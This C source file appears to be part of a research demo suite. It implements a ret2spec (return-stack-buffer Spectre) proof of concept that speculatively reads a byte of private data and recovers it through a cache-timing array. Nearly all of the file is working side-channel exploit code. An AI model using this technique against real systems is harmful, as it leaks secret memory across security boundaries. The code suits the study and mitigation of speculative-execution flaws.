#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#include "trex.h"
#include "demo.h"
#include "timing_array.h"
#include "ret2spec.h"
#include "cache.h"

void (*return_true_base_case)(void);
void (*return_false_base_case)(void);

struct timing_array *ta;
size_t current_offset;
bool false_value = false;
char **stack_mark_pointers;
unsigned char stack_depth = 0;

bool returns_false(int counter)
{
	if (counter > 0) {
		if (returns_false(counter - 1)) {
			// Unreachable code. returns_false() can never return true.
			force_read(ta->entries[(size_t)private_data[current_offset]]);
			printf("Dead code. Must not be printed.\n");
			exit(1);
		}
	} else {
		// Increase the interference if running cross-address-space.
		return_true_base_case();
	}
	return false_value;
}

static bool returns_true(int counter)
{
	char stack_mark = 'a';
	stack_mark_pointers[stack_depth++] = &stack_mark;

	if (counter > 0) {
		returns_true(counter - 1);
	} else {
		return_false_base_case();
	}

	stack_depth--;
	// Flush everything from our stack mark to the stack mark of the caller.
	// The return pointer will be somewhere in-between, forcing the CPU to
	// have to go out to memory to get it, giving it time to speculate using
	// the RSB.
	flush_cache_range(&stack_mark, stack_mark_pointers[stack_depth - 1]);
	return true;
}

char ret2spec_leak_byte(void)
{
	ta = ta_new();
	stack_mark_pointers = malloc(sizeof(char *) * (RECURSION_DEPTH + 2));

	for (int run = 0;; run++) {
		ta_flush(ta);

		char stack_mark = 'a';
		stack_mark_pointers[stack_depth++] = &stack_mark;
		returns_true(RECURSION_DEPTH);
		stack_depth--;

		int result = ta_find_first_cached_index(ta);

		assert(stack_depth == 0);

		if (result >= 0) {
			free(stack_mark_pointers);
			ta_free(ta);
			return result;
		}

		if (run > 100000) {
			free(stack_mark_pointers);
			ta_free(ta);
			trex_demo_exit(TREX_COULDNT_LEAK);
		}
	}
}
